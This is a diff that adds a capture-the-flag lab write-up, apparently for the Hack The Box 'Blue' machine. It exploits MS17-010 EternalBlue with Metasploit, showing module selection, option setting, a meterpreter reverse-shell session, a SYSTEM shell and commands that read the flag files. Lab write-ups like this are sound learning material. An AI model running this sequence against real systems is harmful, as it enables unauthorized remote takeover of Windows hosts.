@@ -168,3 +168,288 @@ Nmap done: 1 IP address (1 host up) scanned in 2.99 seconds
 ```
 
 The machine is vulnerable!
+
+## Exploiting EternalBlue via Metasploit (smh)
+Being stuck on this box for a while, I hadn't got the time nor luck finding a script exploiting this vulnerability that is easy to use. For now I opt for using Metasploit, hoping to go back someday and pwn the machine without it.
+
+With the help of [this tutorial](https://shreybs.github.io/EternalBlue/) I used Metasploit to execute EternalBlue:
+
+I first initialized Metasploit:
+
+```bash
+(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ msfconsole
+Metasploit tip: Set the current module's RHOSTS with database values using
+hosts -R or services -R
+
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |
+  +---------------------------+---------------------------+
+  |      __________________   |                           |
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
+  |             )=\           | |  EXPLOIT   \            |
+  |            // \\          | |_____________\_______    |
+  |           //   \\         | |==[msf >]============\   |
+  |          //     \\        | |______________________\  |
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
+  |        //         \\      |  *********************    |
+  +---------------------------+---------------------------+
+  |      o O o                |        \'\/\/\/'/         |
+  |              o O          |         )======(          |
+  |                 o         |       .'  LOOT  '.        |
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
+  | |________________|__|)__| |    |     __||_)     |     |
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
+  |  = = = = = = = = = = = =  |     '--------------'      |
+  +---------------------------+---------------------------+
+
+
+       =[ metasploit v6.4.44-dev                          ]
++ -- --=[ 2487 exploits - 1281 auxiliary - 431 post       ]
++ -- --=[ 1466 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 >
+```
+
+I then searched for a vulnerability through the name of the aforementioned Microsoft Bulletin:
+
+```bash
+msf6 > search ms17-010
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue
+SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+
+
+Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
+After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
+
+msf6 > use 0
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+```
+
+I picked the first result.
+
+Default options:
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
+                                             oit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
+                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7
+target
+                                             machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
+                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
+                                             ines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
+                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+```
+
+Changing options:
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
+RHOSTS => 10.10.10.40
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.19
+LHOST => 10.10.14.19
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 1234
+LPORT => 1234
+```
+
+Changed options:
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.10.10.40      yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
+                                             oit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
+                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7
+target
+                                             machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
+                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
+                                             ines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
+                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.19      yes       The listen address (an interface may be specified)
+   LPORT     1234             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+```
+I executed the script:
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+[*] Started reverse TCP handler on 10.10.14.19:1234
+[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.10.40:445 - The target is vulnerable.
+[*] 10.10.10.40:445 - Connecting to target for exploitation.
+[+] 10.10.10.40:445 - Connection established for exploitation.
+[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
+[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
+[*] 10.10.10.40:445 - Starting non-paged pool grooming
+[+] 10.10.10.40:445 - Sending SMBv2 buffers
+[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
+[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
+[*] 10.10.10.40:445 - Receiving response from exploit packet
+[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.10.40:445 - Sending egg to corrupted connection.
+[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
+[*] Sending stage (203846 bytes) to 10.10.10.40
+[*] Meterpreter session 1 opened (10.10.14.19:1234 -> 10.10.10.40:49158) at 2025-01-31 07:42:10 -0500
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter >
+```
+
+I then switched the shell to a cmd windows shell:
+
+```bash
+meterpreter > shell
+Process 2308 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>
+```
+
+Running `whoami` revealed that I am already `system` (windows version of Linux's `root`):
+
+```bash
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+Getting the was now trivial with the following commands:
+
+```bash
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+C:\Windows\system32>type C:\Users\haris\Desktop\user.txt
+```
+
+
+### ASIDE - dumb nc mistake
+Being unfamiliar with Metasploit, I thought that I needed to setup a nc listener for the reverse shell. This is wrong, as Metasploit will try to set it up itself.
+
+When I created a nc listener:
+
+```bash
+(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ nc -lvnp 1234
+listening on [any] 1234 ...
+
+```
+
+And tried to execute the script I got an error:
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+[-] Handler failed to bind to 10.10.14.19:1234:-  -
+[-] Handler failed to bind to 0.0.0.0:1234:-  -
+[-] 10.10.10.40:445 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:1234).
+[*] Exploit completed, but no session was created.
+```
+
+_The more I know_
